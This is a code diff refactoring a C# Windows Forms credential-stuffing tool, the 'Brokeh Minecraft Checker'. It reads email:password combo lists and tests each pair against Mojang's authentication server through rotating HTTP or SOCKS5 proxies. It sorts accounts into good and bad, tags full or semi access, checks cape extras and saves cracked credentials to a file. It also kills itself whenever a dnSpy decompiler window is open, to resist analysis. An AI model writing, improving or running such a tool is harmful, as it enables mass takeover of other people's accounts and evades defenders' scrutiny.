@@ -1,599 +1,529 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.IO;
 using System.Linq;
-using System.Text;
+using System.Net;
+using System.Runtime.CompilerServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using xNet;
-using System.Web;
+using Brokeh_Minecraft_Checker.Common;
 using Newtonsoft.Json;
-using System.Runtime.CompilerServices;
-using Newtonsoft.Json.Linq;
-using System.Net;
-using System.Diagnostics;
+using xNet;
+using HttpStatusCode = xNet.HttpStatusCode;
 
 namespace Brokeh_Minecraft_Checker
 {
     public partial class Form1 : Form
     {
-
-        string versao = "2.4.0";
-        string changelog = "added dark theme and internal changes.";
-        string[] combo;
-        string[] proxies;
-        int countGood;
-        int countErro;
-        int countBad;
-        int countThreads;
-        int countTested;
-        object object_0;
-        Random random_0 = new Random();
-        Thread[] thread_0;
-        int status; // 0 = STOPPED | 1 = RUNNING
-        string username;
-        public Form1(string hwid)
+        private static readonly List<AccountExtra> EnabledExtras = new List<AccountExtra>()
         {
+            new OptifineCapeExtra()
+        };
 
-            var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
-            foreach (var process in processes)
-            {
-                var id = process.Id;
-                var Wintitle = process.MainWindowTitle.ToString();
-                if (Wintitle.Contains("dnSpy"))
-                {
-                    Process.GetCurrentProcess().Kill();
-                }
-            }
-
-            string error2 = "Internal error!";
-            InitializeComponent();
-            Control.CheckForIllegalCrossThreadCalls = false;
-            this.object_0 = RuntimeHelpers.GetObjectValue(new object());
-
-            WebClient wC = new WebClient();
-
-            string resposta = wC.DownloadString("http://brokeh-checker.tk/check.php?hwid=" + hwid);
-
-            if (resposta.Contains("OK|"))
-            {
-
-                username = resposta.Replace("OK|", "");
-                this.Text = "Brokeh Minecraft Checker v-"+versao+" [User: " + username+ "] ["+versao+": "+changelog+"]";
-
-            }
-            else if (resposta.Contains("Not authorized!"))
-            {
-                MessageBox.Show(resposta);
-
-                Application.Exit();
-            }
-            else
-            {
-                MessageBox.Show(error2);
-
-                Application.Exit();
-            }
-            resposta = wC.DownloadString("http://brokeh-checker.tk/versao.txt");
-            if(!resposta.Contains(versao))
-            {
-                MessageBox.Show("New version available! Go to our website.");
-            }
-            else
-            {
-
-            }
-
-
+        public sealed override string Text
+        {
+            get => base.Text;
+            set => base.Text = value;
         }
-       
 
-        public Queue<string> queue_0;
+        private const string Version = "2.4.0";
+        private const string AuthServerEndpoint = "https://authserver.mojang.com/authenticate";
+
+        private readonly Random _random;
+        private readonly List<Account> _resolvedAccounts;
+
+        private BlockingCollection<AccountData> _queue;
+        private int _countGood;
+        private int _countError;
+        private int _countBad;
+        private int _countThreads;
+        private int _countTested;
+        private Task[] _tasks;
+        private int _status; // 0 = STOPPED | 1 = RUNNING
+        private List<AccountData> _accounts;
+        private List<string> _proxies;
+        private CancellationTokenSource _cancellationToken;
+        private string _saveFile;
+
+        public Form1()
+        {
+            _resolvedAccounts = new List<Account>();
+            _random = new Random();
+
+            Program.KillDnSpyProcessByName();
+            InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false;
+        }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.Title = "Select Combo List";
-            ofd.Filter = "Combo | *.txt";
-            if(ofd.ShowDialog() == DialogResult.OK)
+            var fileDialog = new OpenFileDialog
             {
-                try
-                {
-                    combo = File.ReadAllText(ofd.FileName).Split(new[] { Environment.NewLine }, StringSplitOptions.None);
-                    var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
-                    foreach (var process in processes)
-                    {
-                        var id = process.Id;
-                        var Wintitle = process.MainWindowTitle.ToString();
-                        if (Wintitle.Contains("dnSpy"))
-                        {
-                            Process.GetCurrentProcess().Kill();
-                        }
-                    }
-                }
-                catch (Exception)
-                {
+                Title = "Select Combo List",
+                Filter = "Combo | *.txt"
+            };
 
-                    MessageBox.Show("Invalid combo list.\nCombo format is EMAIL:PASSWORD");
+            if (fileDialog.ShowDialog() != DialogResult.OK)
+                return;
+
+            try
+            {
+                _accounts = new List<AccountData>();
+                int failed = 0;
+                foreach (string line in File.ReadAllLines(fileDialog.FileName))
+                {
+                    string[] split = line.Split(':');
+                    if (split.Length < 2)
+                    {
+                        failed++;
+                        continue;
+                    }
+
+                    _accounts.Add(new AccountData(split[0], split[1]));
                 }
-                
+
+                messageBox.AppendText(
+                    $"INFO |\tLoaded {_accounts.Count} Account entries ({failed} failed) {Environment.NewLine}");
+
+                Program.KillDnSpyProcessByName();
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("Invalid combo list.\nCombo format is EMAIL:PASSWORD");
             }
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.Title = "Select Proxy List";
-            ofd.Filter = "Proxy | *.txt";
-            if (ofd.ShowDialog() == DialogResult.OK)
+            var fileDialog = new OpenFileDialog
             {
+                Title = "Select Proxy List",
+                Filter = "Proxy | *.txt"
+            };
+
+            if (fileDialog.ShowDialog() != DialogResult.OK)
+                return;
+
+            try
+            {
+                _proxies = new List<string>();
+                _proxies.AddRange(File.ReadAllLines(fileDialog.FileName));
+                messageBox.AppendText("INFO |\tLoaded " + _proxies.Count + " Proxy entries" + Environment.NewLine);
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("Invalid proxy list list.\nProxy list format is IP:PORT");
+            }
+        }
+
+        /// <summary>
+        /// The terminator will kill all running tasks
+        /// </summary>
+        private void Terminator()
+        {
+            // Cancel all tasks
+            _cancellationToken.Cancel();
+        }
+
+        /// <summary>
+        /// The "Checker" method used to run in an async task
+        /// which checks the queued accounts for valid credentials
+        /// </summary>
+        private void Checker()
+        {
+            Program.KillDnSpyProcessByName();
+
+            // Select random proxy
+            int indexProxy = _random.Next(0, _proxies.Count);
+            string proxyAddress = _proxies[indexProxy];
+
+            // Loop until the queue count hits 0
+            while (_queue.Count > 0)
+            {
+                // Check if the task should be canceled
+                if (_cancellationToken.IsCancellationRequested)
+                {
+                    return;
+                }
+
                 try
                 {
-                    proxies = File.ReadAllText(ofd.FileName).Split(new[] { Environment.NewLine }, StringSplitOptions.None);
+                    Program.KillDnSpyProcessByName();
 
-                }
-                catch (Exception)
-                {
-
-                    MessageBox.Show("Invalid proxylist list.\nProxylist format is IP:PORT");
-                }
-               
-            }
-        }
-
-        void termina()
-        {
-            if(status == 1)
-            {
-                int num = Convert.ToInt32(this.quantidadeThreads.Value);
-                for (int i = 0; i < num; i++)
-                {
-                    this.thread_0[i].Abort();
-                    countThreads--;
-                    if (countThreads == 0)
+                    var accountData = _queue.Take();
+                    using (var httpRequest = new HttpRequest())
                     {
-                        status = 0;
-                        timer2.Stop();
-                        pictureBox1.Visible = false;
-                        MessageBox.Show("FINISHED!");
-                    }
-                }
-
-            }
-            else
-            {
-                MessageBox.Show("The checker is not running");
-            }
-           
-        }
-        void Checker()
-        {
-            var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
-            foreach (var process in processes)
-            {
-                var id = process.Id;
-                var Wintitle = process.MainWindowTitle.ToString();
-                if (Wintitle.Contains("dnSpy"))
-                {
-                    Process.GetCurrentProcess().Kill();
-                }
-            }
-            if (status == 1)
-            {
-                int indexProxy = random_0.Next(1, proxies.Length);
-                string proxyAtual = proxies[indexProxy];
-                while (this.queue_0.Count > 0)
-                {
-                    object objectValue = RuntimeHelpers.GetObjectValue(this.object_0);
-                    bool flag = false;
-                    object objectValue3;
-                    string text = "";
-                    try
-                    {
-                        processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
-                        foreach (var process in processes)
-                        {
-                            var id = process.Id;
-                            var Wintitle = process.MainWindowTitle.ToString();
-                            if (Wintitle.Contains("dnSpy"))
-                            {
-                                Process.GetCurrentProcess().Kill();
-                            }
-                        }
-                        object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
-                        objectValue3 = RuntimeHelpers.GetObjectValue(objectValue2);
-                        Monitor.Enter(RuntimeHelpers.GetObjectValue(objectValue2), ref flag);
                         try
                         {
+                            // Parse proxy set Http or Socks5 according to the user input
+                            httpRequest.Proxy = ProxyClient.Parse(
+                                (https.Checked ? ProxyType.Http : ProxyType.Socks5),
+                                proxyAddress);
 
+                            // Prepare the payload of request
+                            string payload = PrepareRequest(httpRequest, accountData);
 
-                            text = queue_0.Peek().ToString().Replace("\r", "");
-                            this.queue_0.Dequeue();
+                            // Get the response
+                            var responseObj = httpRequest.Post(AuthServerEndpoint,
+                                payload, "application/json");
+
+                            // Get response body
+                            string response = responseObj.ToString();
+
+                            // Handle response
+                            HandleResponse(response, accountData, ref proxyAddress);
                         }
-                        catch (Exception ex)
+                        catch (Exception e)
                         {
+                            // Switching proxy
+                            _proxies.Remove(proxyAddress);
+                            proxyAddress = _proxies[_random.Next(0, _proxies.Count)];
+
+                            // Requeue data
+                            _queue.Add(accountData);
+
+                            // Incrementing error counter
+                            Interlocked.Increment(ref _countError);
+
+                            Program.KillDnSpyProcessByName();
+
+                            // Informing the user
+                            messageBox.AppendText("INFO |\tRequest failed for " + accountData + " switching proxy"
+                                                  + Environment.NewLine);
                         }
-
                     }
-                    finally
-                    { }
-                    if (flag)
-                    {
-                        Monitor.Exit(RuntimeHelpers.GetObjectValue(objectValue3));
-                    }
-
-
-
-                    try
-                    {
-
-                        string[] conta = text.Split(':');
-                        using (HttpRequest httpRequest = new HttpRequest())
-                        {
-
-                            if(https.Checked == true)
-                            {
-                                httpRequest.Proxy = ProxyClient.Parse(ProxyType.Http, proxyAtual);
-                            }
-                            else
-                            {
-                                httpRequest.Proxy = ProxyClient.Parse(ProxyType.Socks5, proxyAtual);
-                            }
-                            
-                            CookieDictionary cookies = new CookieDictionary(false);
-                            httpRequest.Cookies = cookies;
-                            httpRequest.IgnoreProtocolErrors = true;
-                            httpRequest.ConnectTimeout = Convert.ToInt32(timeoutValue.Value) * 1000;
-                            httpRequest.AllowAutoRedirect = true;
-                            httpRequest.KeepAlive = true;
-                            httpRequest.Referer = "https://minecraft.net/pt-br/login/";
-                            httpRequest.UserAgent = "Minecraft Launcher/2.0.1049 (061d773c8e) Windows (6.1; x86)";
-                            httpRequest.AddHeader("Origin", "mojang://launcher");
-
-
-                            string payload = string.Concat(new string[]
-                                {
-                            "{ \"agent\":{ \"name\":\"Minecraft\",\"version\":1},\"username\":\"",
-                            conta[0],
-                            "\",\"password\":\"",
-                            conta[1],
-                            "\",\"clientToken\":\"ec8503f9-f717-46b3-b755-78db16771163\",\"requestUser\":\"true\"}"
-                                });
-
-
-                            try
-                            {
-                                string resposta = httpRequest.Post("https://authserver.mojang.com/authenticate", payload, "application/json").ToString();
-                                if (resposta.Contains("Invalid username or password."))
-                                {
-                                    
-                                    countBad++;
-                                   
-                                }
-                                else if (resposta.Contains("accessToken"))
-                                {
-                                    if (resposta.Contains("\"selectedProfile\":{"))
-                                    {
-                                        string extras = "";
-                                        dynamic results = JsonConvert.DeserializeObject<dynamic>(resposta);
-
-                                        string nick = results.availableProfiles[0].name;
-
-
-
-
-                                        try
-                                        {
-                                            if(results.user.secured == true)
-                                            {
-                                                extras += "SFA: False | ";
-                                            }
-                                            else
-                                            {
-                                                extras += "SFA: True | ";
-                                            }
-                                        }
-                                        catch (Exception)
-                                        {
-                                            extras += "SFA: Undefined | ";
-                                        }
-
-
-
-
-                                        // OPTIFINE CAPE CHECKER
-
-
-
-
-                                        // MINECON AND UNMIGRATED CHECKER (NAMEMC.COM)
-
-                                        string resposta2 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/cape/optifine.php?username=" + nick).ToString();
-                                        extras += "Optifine Cape: " + resposta2 + " | ";
-                                        string resposta3 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/cape/minecon.php?username=" + nick).ToString();
-                                        extras += "Minecon Cape: "+resposta3+" | ";
-                                        string respostaUnmigrated = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/mojang/migration.php?username=" + nick).ToString();
-                                        extras += respostaUnmigrated + " | ";
-                                        string resposta4 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/rank/hypixel.php?username=" + nick).ToString();
-                                        extras += "Hypixel Rank: " + resposta4 + " | ";
-                                        
-                                   
-                                       
-                                        aprovadas.AppendText("GOOD | " + conta[0] + " | " + conta[1] + " | NICK: " + nick + " | " + extras + " | PROXY: " + proxyAtual + " | #BrokehChecker" + Environment.NewLine);
-
-                                        countGood++;
-
-                                    }
-                                    else
-                                    {
-                                        countBad++;
-                                        
-                                    }
-
-
-                                }
-                                else
-                                {
-                                    proxyAtual = proxies[random_0.Next(1, proxies.Length)];
-                                    this.queue_0.Enqueue(text);
-                                    countErro++;
-                                }
-
-                            }
-                            catch (Exception)
-                            {
-                                proxyAtual = proxies[random_0.Next(1, proxies.Length)];
-                                this.queue_0.Enqueue(text);
-                                countErro++;
-                                 processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
-                                foreach (var process in processes)
-                                {
-                                    var id = process.Id;
-                                    var Wintitle = process.MainWindowTitle.ToString();
-                                    if (Wintitle.Contains("dnSpy"))
-                                    {
-                                        Process.GetCurrentProcess().Kill();
-                                    }
-                                }
-                            }
-
-
-                           
-
-
-
-                        }
-
-                    }
-                    catch
-                    {
-                        countErro++;
-                    }
-
-
-                    countTested++;
-
                 }
-               
+                catch
+                {
+                    // Incrementing error counter
+                    Interlocked.Increment(ref _countError);
+                }
+
+                // Incrementing tested counter
+                Interlocked.Increment(ref _countTested);
             }
-           
         }
+
+        /// <summary>
+        /// Checks if the response can be parsed and will increment error counters if the request fails
+        /// </summary>
+        /// <param name="response">The http response</param>
+        /// <param name="accountData">The account data</param>
+        /// <param name="proxyAddress">The address for the proxy</param>
+        private void HandleResponse(string response, AccountData accountData, ref string proxyAddress)
+        {
+            // Check if username or password is invalid
+            if (response.Contains("Invalid username or password."))
+            {
+                messageBox.AppendText("BAD  |\t" + accountData + Environment.NewLine);
+                Interlocked.Increment(ref _countBad);
+                return;
+            }
+
+            // Check if access token is available
+            if (!response.Contains("accessToken"))
+            {
+                // Switching proxy
+                _proxies.Remove(proxyAddress);
+                proxyAddress = _proxies[_random.Next(1, _proxies.Count)];
+
+                // Requeue data 
+                _queue.Add(accountData);
+
+                // Updating 
+                Interlocked.Increment(ref _countError);
+
+                // Inform user
+                messageBox.AppendText($"INFO |\t{accountData} failed, switching proxy{Environment.NewLine}");
+                return;
+            }
+
+            // Parse Response
+            var account = ParseResponse(response, accountData);
+            account.Proxy = proxyAddress;
+            // Add parsed account to resolved accounts
+            _resolvedAccounts.Add(account);
+
+            // Incrementing the good counter
+            Interlocked.Increment(ref _countGood);
+
+            // Informing the user
+            messageBox.AppendText("GOOD |\t" + account + Environment.NewLine);
+        }
+
+        /// <summary>
+        /// Parses the response into an object format and looks fo extras
+        /// </summary>
+        /// <param name="response">The response to parse</param>
+        /// <param name="accountData">The used account data</param>
+        /// <returns>The parsed Account</returns>
+        private Account ParseResponse(string response, AccountData accountData)
+        {
+            // Parse JSON Response
+            var results = JsonConvert.DeserializeObject<dynamic>(response);
+
+            // Get nick name from profiles
+            string nick = results.availableProfiles[0].name;
+            // Make new account instance
+            var account = new Account(nick, accountData.Password);
+
+            string accountType;
+            try
+            {
+                // Check if the account is Not full access or semi access
+                accountType = results.user.secured ? "NFA" : "SFA";
+            }
+            catch (Exception)
+            {
+                accountType = "None";
+            }
+
+            // Set account type
+            account.Type = accountType;
+
+            // Check enabled extras
+            EnabledExtras.ForEach(extra =>
+            {
+                bool f = extra.CheckExtra(account);
+                if (f) account.Extras.Add(extra);
+            });
+
+            // Check if the file is not null
+            if (_saveFile != null)
+            {
+                // Saving result in file
+                Task.Run(async () => await AppendSaveFile(account));
+            }
+
+            return account;
+        }
+
+        /// <summary>
+        /// Will append the selected file with the given account
+        /// </summary>
+        /// <param name="account">The account</param>
+        /// <returns>Task</returns>
+        private async Task AppendSaveFile(Account account)
+        {
+            using (var writer = File.AppendText(_saveFile))
+            {
+                await writer.WriteLineAsync(account.ToCsv());
+                await writer.FlushAsync();
+            }
+        }
+
+        /// <summary>
+        /// Prepares the request
+        /// </summary>
+        /// <param name="request">The request object</param>
+        /// <param name="accountData">The account credentials</param>
+        /// <returns>The payload of the request</returns>
+        private string PrepareRequest(HttpRequest request, AccountData accountData)
+        {
+            var cookies = new CookieDictionary();
+            request.Cookies = cookies;
+            request.IgnoreProtocolErrors = true;
+            request.ConnectTimeout = Convert.ToInt32(timeoutValue.Value) * 1000;
+            request.AllowAutoRedirect = true;
+            request.KeepAlive = true;
+            // request.Referer = "https://minecraft.net/pt-br/login/";
+            // request.UserAgent = "Minecraft Launcher/2.0.1049 (061d773c8e) Windows (6.1; x86)";
+            // request.AddHeader("Origin", "mojang://launcher");
+
+            /*
+             * {
+             *     "agent": {
+             *         "name": "Minecraft",
+             *         "version": 1,
+             *     },
+             *     "username": "USERNAME",
+             *     "password": "PASSWORD",
+             *     "clientToken": "TOKEN",
+             *     "requestUser": true
+             * }
+             */
+            string payload = string.Concat(@"{ ""agent"":{ ""name"":""Minecraft"",""version"":1},""username"":""",
+                accountData.Email, @""",""password"":""", accountData.Password, @""",""requestUser"":""true""}"
+            );
+
+            return payload;
+        }
+
         private void button3_Click(object sender, EventArgs e)
         {
-          
-            if (status == 0) {
-                pictureBox1.Visible = true;
-                status = 1;
-
-
-                button1.Enabled = false;
-                button2.Enabled = false;
-                button3.Enabled = false;
-                socks5.Enabled = false;
-                https.Enabled = false;
-
-
-                timer2.Start();
-
-                if (combo.Count() > 0 && proxies.Count() > 0)
-                {
-                    countGood = 0;
-                    countErro = 0;
-                    countTested = 0;
-                    countBad = 0;
-                    queue_0 = new Queue<string>();
-
-                    int num = combo.Length;
-
-                    for (int i = 0; i < num; i++)
-                    {
-                        queue_0.Enqueue(combo[i]);
-                    }
-
-                    int numerodethreads = Convert.ToInt32(quantidadeThreads.Value);
-
-                    thread_0 = new Thread[numerodethreads];
-
-                    int numerodethreadstotal = numerodethreads;
-                    for (int j = 0; j < numerodethreadstotal; j++)
-                    {
-                        thread_0[j] = new Thread(new ThreadStart(Checker));
-                        thread_0[j].IsBackground = true;
-                        thread_0[j].Start();
-                        countThreads++;
-                    }
-
-
-                }
-                else
-                {
-                    MessageBox.Show("Load Combo list and Proxy list!");
-                }
-            }
-            else
+            if (_status != 0)
             {
                 MessageBox.Show("Checker already started");
+                return;
             }
-           
+
+            if (_accounts == null)
+            {
+                MessageBox.Show("No accounts have been selected");
+                return;
+            }
+
+            if (_proxies == null)
+            {
+                MessageBox.Show("No proxies have been selected");
+                return;
+            }
+
+            if (_saveFile == null)
+            {
+                var result = MessageBox.Show(
+                    "No Save File Selected, the results will not be saved. Should the programme continue",
+                    "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
+                if (result != DialogResult.Yes)
+                    return;
+            }
+
+
+            pictureBox1.Visible = true;
+            _status = 1;
+
+            button1.Enabled = false;
+            button2.Enabled = false;
+            button3.Enabled = false;
+            socks5.Enabled = false;
+            https.Enabled = false;
+
+            if (!_accounts.Any() || !_proxies.Any())
+            {
+                MessageBox.Show("Load Combo list and Proxy list!");
+                return;
+            }
+
+            _countGood = 0;
+            _countError = 0;
+            _countTested = 0;
+            _countBad = 0;
+
+            _queue = new BlockingCollection<AccountData>();
+            foreach (var account in _accounts)
+            {
+                _queue.Add(account);
+            }
+
+            StartThreads();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        /// <summary>
+        /// Starting the selected amount of threads and beginning to check
+        /// </summary>
+        private void StartThreads()
         {
-            label7.Text = "B R O K E H    M I N E C R A F T   C H E C K E R   "+versao;
+            // Get the total number of threads
+            int numberOfThreads = decimal.ToInt16(threadCount.Value);
+
+            // Initialize or reinitialize the tasks array
+            _tasks = new Task[numberOfThreads];
+
+            _cancellationToken = new CancellationTokenSource();
+
+            // Loop until number of threads is reached
+            for (int j = 0; j < numberOfThreads; j++)
+            {
+                // Run a new task with the #Checker method 
+                // and set the created task into the array using the current index.
+                // The cancellation token will be set so the task can be stopped at any time
+                _tasks[j] = Task.Run(Checker, _cancellationToken.Token);
+
+                // Incrementing thread count
+                _countThreads++;
+            }
+
+            // Make a new task for listening to the other threads
+            Task.Run(async () =>
+            {
+                await Task.WhenAll(_tasks);
+                Done();
+                MessageBox.Show("Done!");
+            });
         }
 
-        private void timer1_Tick(object sender, EventArgs e)
+        private void Done()
         {
-            countErrorLabel.Text = countErro.ToString();
-            countGoodsLabel.Text = countGood.ToString();
-            countsTestedsLabel.Text = countTested.ToString();
-            countBadLabel.Text = countBad.ToString();
-            threadsCountLabel.Text = countThreads.ToString();
+            // Terminate all tasks
+            Terminator();
 
-
-        }
-
-        private void button4_Click(object sender, EventArgs e)
-        {
-            termina();
+            // Enable UI Components
             button1.Enabled = true;
             button2.Enabled = true;
             button3.Enabled = true;
             socks5.Enabled = true;
             https.Enabled = true;
+
+            // Disable picture box
+            pictureBox1.Visible = false;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            label7.Text = "B R O K E H    M I N E C R A F T   C H E C K E R   " + Version;
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            // Updating UI Text elements
+            countErrorLabel.Text = _countError.ToString();
+            countGoodsLabel.Text = _countGood.ToString();
+            countsTestedsLabel.Text = _countTested.ToString();
+            countBadLabel.Text = _countBad.ToString();
+            threadsCountLabel.Text = _countThreads.ToString();
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            Done();
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-
             Application.Exit();
         }
 
-        private void groupBox4_Enter(object sender, EventArgs e)
-        {
 
-        }
-
-        private void timer2_Tick(object sender, EventArgs e)
+        private void saveButton_Click(object sender, EventArgs e)
         {
-            if(status == 1)
+            SaveFileDialog fileDialog = new SaveFileDialog()
             {
-                if (countTested == combo.Length)
-                {
+                Filter = "Text Files (*.txt)|*.txt|CSV file (*.csv)|*.csv",
+            };
 
-                    timer2.Stop();
-                    button4.PerformClick();
+            if (fileDialog.ShowDialog() != DialogResult.OK)
+                return;
+
+            if (!File.Exists(fileDialog.FileName))
+            {
+                using (var writer = File.CreateText(fileDialog.FileName))
+                {
+                    writer.WriteLine("email:password,extras,proxy");
+                    writer.Flush();
+                    writer.Close();
                 }
             }
+
+            _saveFile = fileDialog.FileName;
         }
 
-        private void groupBox1_Enter(object sender, EventArgs e)
+        private struct AccountData
         {
+            public AccountData(string email, string password)
+            {
+                Email = email;
+                Password = password;
+            }
 
-        }
+            public string Email { get; }
+            public string Password { get; }
 
-        private void label6_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void socks5_CheckedChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void https_CheckedChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void timeoutValue_ValueChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void quantidadeThreads_ValueChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label4_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void pictureBox1_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void threadsCountLabel_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label8_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void countErrorLabel_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void countBadLabel_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label5_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label3_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void countGoodsLabel_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label2_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void countsTestedsLabel_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label1_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label7_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label9_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void panel1_Paint(object sender, PaintEventArgs e)
-        {
-
+            public override string ToString()
+            {
+                return $"{Email}:{Password}";
+            }
         }
     }
 }
